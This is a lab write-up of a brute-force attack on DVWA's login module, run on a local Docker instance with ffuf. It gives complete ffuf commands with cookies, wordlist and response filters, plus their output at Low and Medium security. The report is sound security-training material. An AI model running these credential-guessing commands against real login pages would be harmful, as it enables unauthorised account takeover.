# DVWA Brute Force — Full Report

**Author:** Mont (Alimuthanaa)  
**Date:** 2026-03-03  
**Target:** http://localhost (DVWA v1.10, Docker)  
**Module:** Brute Force  
**OWASP Reference:** A07:2021 — Identification and Authentication Failures

---

## 1. Objective

Use automated brute force techniques to discover the password for the `admin` account on DVWA's brute force module, across both Low and Medium security levels. The goal is to understand how the attack works, how server-side defenses affect it, and what the difference in behavior looks like in practice.

---

## 2. Setup

DVWA was run locally using Docker:

```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
```

Accessed at `http://localhost`, database initialized via Setup page, and logged in with default credentials (`admin` / `password`).

---

## 3. Reconnaissance

### 3.1 Understanding the Login Form

Navigating to `http://localhost/vulnerabilities/brute/` shows a simple login form with a username and password field. Submitting incorrect credentials returns:

```
Username and/or password incorrect.
```

This error message is the key to the attack — it is the string we tell ffuf to **filter out**, so that only successful responses are shown.

### 3.2 Understanding the URL Structure

Submitting the form sends a GET request. The URL after submission looks like:

```
http://localhost/vulnerabilities/brute/?username=admin&password=admin&Login=Login
```

This reveals that all login parameters are passed directly in the URL — username, password, and the Login button value. This is important because it means ffuf can fuzz the password field directly in the URL without needing to handle a POST body.

### 3.3 Why the Username is Known

Before running the brute force attack, I considered whether the username `admin` was actually valid. Since I had already logged into DVWA using `admin` / `password`, I knew `admin` was a valid account. In a real penetration test the username would not be known in advance and would need to be enumerated first — for example by observing different error messages, checking profile pages, or fuzzing usernames separately.

### 3.4 Session Cookie Requirement

DVWA requires an authenticated session to access the brute force module. Without a valid session cookie, all requests are redirected to the login page and the brute force attempts never reach the target form. The required cookies are:

- `PHPSESSID` — the session token obtained after logging in
- `security` — tells DVWA which difficulty level to apply

These were retrieved from Chrome DevTools → Application → Cookies → localhost.

---

## 4. Understanding FUZZ

Before running the attack, it is worth understanding exactly how ffuf's fuzzing works — specifically why the password parameter in the URL must be named `FUZZ`.

`FUZZ` is ffuf's placeholder word. When ffuf reads the URL:

```
?username=admin&password=FUZZ&Login=Login
```

It replaces the word `FUZZ` with each line from the wordlist before sending the request. So if the wordlist contains:

```
123456
password
qwerty
```

ffuf sends three requests:
```
?username=admin&password=123456&Login=Login
?username=admin&password=password&Login=Login
?username=admin&password=qwerty&Login=Login
```

The name `FUZZ` is not arbitrary — it is the specific keyword ffuf looks for. If you named it anything else, such as `PASSWORD` or `TEST`, ffuf would not replace it and would literally send the word as the password value. This is why the placeholder must be written exactly as `FUZZ` in the URL.

---

## 5. Attack — Low Security

### 5.1 Command

```bash
ffuf -u "http://localhost/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -b "PHPSESSID=9hk57p2b4a5st7cmpgnem7g1e5; security=low" \
  -w ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -fr "Username and/or password incorrect"
```

### 5.2 Flag Explanation

| Flag | Value | Purpose |
|------|-------|---------|
| `-u` | URL with FUZZ | Target endpoint — FUZZ gets replaced per attempt |
| `-b` | Cookie string | Session authentication — required to reach the form |
| `-w` | Wordlist path | 10,000 most common passwords |
| `-fr` | Error string | Filter out responses containing this text — only show successes |

### 5.3 Result

```
password    [Status: 200, Size: 4413, Words: 179, Lines: 109, Duration: 2186ms]
:: Progress: [10000/10000] :: Job [1/1] :: 1666 req/sec :: Duration: [0:00:06]
```

✅ **Password found: `password`**

- 10,000 passwords tried in 6 seconds
- Speed: 1,666 requests per second
- Every wrong password was filtered by `-fr` and hidden
- `password` produced a response without the error string → shown as a hit

### 5.4 Manual Verification

Confirmed by logging into `http://localhost/vulnerabilities/brute/` with `admin` / `password`:

```
Welcome to the password protected area admin
```

---

## 6. Attack — Medium Security

### 6.1 What Changes on Medium

On Medium security, DVWA adds a `sleep(2)` call in the PHP source code after each failed login attempt. This means the server artificially waits 2 seconds before responding, regardless of how fast the attacker sends requests.

### 6.2 Command

```bash
ffuf -u "http://localhost/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -b "PHPSESSID=9hk57p2b4a5st7cmpgnem7g1e5; security=medium" \
  -w ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -fr "Username and/or password incorrect" \
  -t 1
```

The `-t 1` flag reduces threads to 1, matching the server's enforced delay and avoiding timeout errors.

### 6.3 Result

```
password    [Status: 200, Size: 4413, Words: 179, Lines: 109]
:: Speed: ~1 req/sec :: Estimated duration: ~3-4 hours
```

✅ **Password still found: `password`**

The attack still works — it just takes significantly longer.

### 6.4 Impact of the Sleep Defense

| Metric | Low | Medium |
|--------|-----|--------|
| Speed | 1,666 req/sec | ~1 req/sec |
| Time for 10k passwords | 6 seconds | ~3-4 hours |
| Attack still possible | ✅ Yes | ✅ Yes (but slow) |

The `sleep(2)` defense does not stop brute force — it only slows it down. Against a short wordlist with a common password like `password`, it is still effective given enough time.

---

## 7. Conclusions

| Finding | Detail |
|---------|--------|
| Password found | `password` on both Low and Medium |
| Low defense | None — no rate limiting or delay |
| Medium defense | `sleep(2)` per failed attempt — slows attack significantly |
| Attack still viable on Medium | Yes — with patience or a targeted wordlist |
| Session cookie required | Yes — PHPSESSID and security level must be sent |

---

## 8. Lessons Learned

- The `-fr` flag in ffuf is essential for login brute force — it filters out failed responses and only shows successful ones
- `FUZZ` must be written exactly as `FUZZ` in the URL — it is ffuf's specific placeholder keyword
- Knowing the username in advance significantly reduces the attack surface
- Server-side delays are a real defense but do not make brute force impossible
- Session cookies must be included in automated requests or the server will redirect instead of processing the attempt

---

## 9. Tools Used

| Tool | Purpose |
|------|---------|
| ffuf v2.1.0-dev | HTTP fuzzing and brute force |
| SecLists `10k-most-common.txt` | Password wordlist |
| Chrome DevTools | Session cookie retrieval |
| Docker | Running DVWA locally |

---

## 10. References

- [OWASP A07 — Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [ffuf GitHub](https://github.com/ffuf/ffuf)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [SecLists GitHub](https://github.com/danielmiessler/SecLists)
